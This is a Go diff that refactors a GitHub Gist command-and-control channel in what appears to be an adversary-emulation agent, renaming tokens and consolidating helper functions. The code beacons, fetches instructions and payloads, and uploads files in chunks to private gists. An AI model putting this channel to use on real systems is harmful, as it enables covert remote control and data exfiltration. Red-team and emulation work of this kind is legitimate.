@@ -27,9 +27,8 @@ const (
 )
 
 var (
-	token = ""
-	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
-	username string
+	gistToken = ""
+	gistUsername string
 )
 
 type GIST struct {
@@ -42,7 +41,7 @@ func init() {
 
 //GetInstructions sends a beacon and returns instructions
 func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
-	checkValidSleepInterval(profile)
+	checkValidGistSleepInterval(profile, githubTimeout, githubTimeoutResetInterval)
 	var retBytes []byte
 	bites, heartbeat := gistBeacon(profile)
 	if heartbeat == true {
@@ -74,9 +73,9 @@ func (g GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string
 func (g GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
     config := make(map[string]string)
     if len(criteria["c2Key"]) > 0 {
-        token = criteria["c2Key"]
+        gistToken = criteria["c2Key"]
         if len(profile["paw"].(string)) == 0 {
-        	config["paw"] = getBeaconNameIdentifier()
+        	config["paw"] = getRandomIdentifier()
         }
         return true, config
     }
@@ -108,7 +107,7 @@ func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string,
 	paw := profile["paw"].(string)
 
 	// Upload file in chunks
-	uploadId := getNewUploadId()
+	uploadId := getRandomIdentifier()
 	dataSize := len(data)
 	numChunks := int(math.Ceil(float64(dataSize) / float64(maxDataChunkSize)))
 	start := 0
@@ -120,7 +119,7 @@ func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string,
 		}
 		chunk := data[start:end]
 		gistDescription := getGistDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
-		if err := uploadFileChunk(gistName, gistDescription, chunk); err != nil {
+		if err := uploadFileChunkGist(gistName, gistDescription, chunk); err != nil {
 			return err
 		}
 		start += maxDataChunkSize
@@ -129,14 +128,14 @@ func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string,
 }
 
 func getGistNameForUpload(paw string) string {
-	return getGistDescriptor("upload", paw)
+	return getDescriptor("upload", paw)
 }
 
 func getGistDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
 	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
 }
 
-func uploadFileChunk(gistName string, gistDescription string, data []byte) error {
+func uploadFileChunkGist(gistName string, gistDescription string, data []byte) error {
 	if result := createGist(gistName, gistDescription, data); result != created {
 		return errors.New(fmt.Sprintf("Failed to create file upload GIST. Response code: %d", result))
 	}
@@ -175,7 +174,7 @@ func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
 		return false
 	} else {
 		paw := profile["paw"].(string)
-		gistName := getGistDescriptor(gistType, paw)
+		gistName := getDescriptor(gistType, paw)
 		gistDescription := gistName
 		if createGist(gistName, gistDescription, data) != created {
 			output.VerbosePrint("[-] Heartbeat GIST: FAILED")
@@ -193,7 +192,7 @@ func gistResults(result map[string]interface{}) {
 		output.VerbosePrint("[-] Results GIST: FAILED")
 	} else {
 		paw := result["paw"].(string)
-		gistName := getGistDescriptor("results", paw)
+		gistName := getDescriptor("results", paw)
 		gistDescription := gistName
 		if createGist(gistName, gistDescription, data) != created {
 			output.VerbosePrint("[-] Results GIST: FAILED")
@@ -225,10 +224,10 @@ func getGists(gistType string, uniqueID string) []string {
 	ctx := context.Background()
 	c2Client := createNewClient()
 	var contents []string
-	gists, _, err := c2Client.Gists.List(ctx, username, nil)
+	gists, _, err := c2Client.Gists.List(ctx, gistUsername, nil)
 	if err == nil {
 		for _, gist := range gists {
-			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
+			if !*gist.Public && (*gist.Description == getDescriptor(gistType, uniqueID)) {
 				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
 				if err == nil {
 					for _, file := range fullGist.Files {
@@ -242,32 +241,12 @@ func getGists(gistType string, uniqueID string) []string {
 	return contents
 }
 
-func getGistDescriptor(gistType string, uniqueId string) string {
-	return fmt.Sprintf("%s-%s", gistType, uniqueId)
-}
-
-func checkValidSleepInterval(profile map[string]interface{}) {
-	if profile["sleep"] == githubTimeout{
-		time.Sleep(time.Duration(float64(githubTimeoutResetInterval)) * time.Second)
-	}
-}
-
-func getBeaconNameIdentifier() string {
-	rand.Seed(time.Now().UnixNano())
-	return strconv.Itoa(rand.Int())
-}
-
 func createNewClient() *github.Client {
 	ctx := context.Background()
 	ts := oauth2.StaticTokenSource(
-		&oauth2.Token{AccessToken: token},
+		&oauth2.Token{AccessToken: gistToken},
 	)
 	tc := oauth2.NewClient(ctx, ts)
 	c2Client := github.NewClient(tc)
 	return c2Client
-}
-
-func getNewUploadId() string {
-	rand.Seed(time.Now().UnixNano())
-	return strconv.Itoa(rand.Int())
 }
